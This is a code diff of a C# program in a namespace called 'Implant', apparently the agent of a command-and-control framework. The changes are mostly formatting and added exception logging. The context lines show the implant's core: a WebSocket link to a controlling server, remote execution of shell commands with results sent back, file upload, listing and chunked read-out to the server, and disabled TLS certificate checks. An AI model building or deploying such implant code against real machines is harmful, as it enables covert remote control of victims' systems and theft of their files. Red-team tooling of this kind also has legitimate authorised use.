@@ -12,12 +12,14 @@ using System.Net.Http;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Net.WebSockets;
+using System.Reflection;
 using System.Runtime.InteropServices;
+using System.Security;
+using System.Security.Principal;
 using System.Text;
+using System.Text.RegularExpressions;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Reflection;
-using System.Security.Principal;
 
 
 namespace Implant
@@ -50,7 +52,7 @@ namespace Implant
         private readonly ConcurrentDictionary<string, string> _uploadDestinations = new ConcurrentDictionary<string, string>();
 
 
-        public Implant(string group = "default", string base_url = "", string sess_key="")
+        public Implant(string group = "default", string base_url="", string sess_key = "")
         {
             _base_url = base_url;
             _group = group;
@@ -97,7 +99,7 @@ namespace Implant
             try
             {
 
-                
+
                 await _ws.ConnectAsync(uri, _wsCancellationTokenSource.Token);
 
                 while (_running && _ws.State == WebSocketState.Open)
@@ -105,10 +107,13 @@ namespace Implant
                     var message = await ReceiveMessage();
                     if (!string.IsNullOrEmpty(message))
                     {
-                        if( message.Contains("Invalid conection")){
+                        if (message.Contains("Invalid conection"))
+                        {
                             await CloseWebSocketAsync();
                             Environment.Exit(0);
-                        }else{
+                        }
+                        else
+                        {
                             await HandleCommand(message);
                         }
                     }
@@ -116,11 +121,12 @@ namespace Implant
             }
             catch (Exception ex)
             {
+                Console.WriteLine(ex.ToString());
             }
         }
 
 
-        
+
         private async Task HandleCommand(string commandJson)
         {
             try
@@ -136,7 +142,7 @@ namespace Implant
                 {
                     var chunkData = JsonConvert.DeserializeObject<Dictionary<string, object>>(data["chunk"].ToString());
                     await HandleFileUpload(chunkData, data["destination"].ToString());
-                    
+
                 }
                 else if (data.ContainsKey("list_files"))
                 {
@@ -168,7 +174,6 @@ namespace Implant
         }
 
 
-
         private async Task<string> ReceiveMessage()
         {
             var buffer = new byte[1024 * 4];
@@ -192,7 +197,7 @@ namespace Implant
 
             return Encoding.UTF8.GetString(ms.ToArray());
         }
-        
+
 
 
         public async Task CloseWebSocketAsync()
@@ -200,11 +205,11 @@ namespace Implant
             try
             {
                 _wsCancellationTokenSource?.Cancel();
-                
+
                 if (_ws != null && _ws.State == WebSocketState.Open)
                 {
-                    await _ws.CloseAsync(WebSocketCloseStatus.NormalClosure, 
-                                        "Client closing", 
+                    await _ws.CloseAsync(WebSocketCloseStatus.NormalClosure,
+                                        "Client closing",
                                         CancellationToken.None);
                 }
             }
@@ -249,7 +254,7 @@ namespace Implant
 
                 if (command.EndsWith(" &"))
                 {
-                    var result =  await ExecuteShellCommand(command);
+                    var result = await ExecuteShellCommand(command);
 
                     await SendResponse(new
                     {
@@ -578,7 +583,7 @@ namespace Implant
                 });
             }
         }
-         private async Task HandleFileUpload(Dictionary<string, object> chunkData, string destination)
+        private async Task HandleFileUpload(Dictionary<string, object> chunkData, string destination)
         {
             try
             {
@@ -616,7 +621,7 @@ namespace Implant
                     true,
                     CancellationToken.None);
                 }
-            
+
             }
             catch (Exception e)
             {
@@ -677,10 +682,10 @@ namespace Implant
         {
             const int chunkSize = 64 * 1024; // 64 KB
 
-                if (filePath.StartsWith("//"))
-                {
-                    filePath = filePath.Replace("//", "/");
-                }
+            if (filePath.StartsWith("//"))
+            {
+                filePath = filePath.Replace("//", "/");
+            }
 
 
             using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read))
@@ -1008,7 +1013,7 @@ namespace Implant
 
                 System.Net.ServicePointManager.ServerCertificateValidationCallback +=
                 (sender, cert, chain, sslPolicyErrors) => true;
-                
+
                 using (var client = new HttpClient())
                 {
                     var content = new StringContent(JsonConvert.SerializeObject(model), Encoding.UTF8, "application/json");
@@ -1019,6 +1024,7 @@ namespace Implant
             catch (Exception ex)
             {
                 Debug.WriteLine($"Register error: {ex.Message}");
+                Console.WriteLine(ex.ToString());
             }
         }
 
@@ -1167,6 +1173,7 @@ namespace Implant
             }
         }
     }
+
 
 
     public class Program
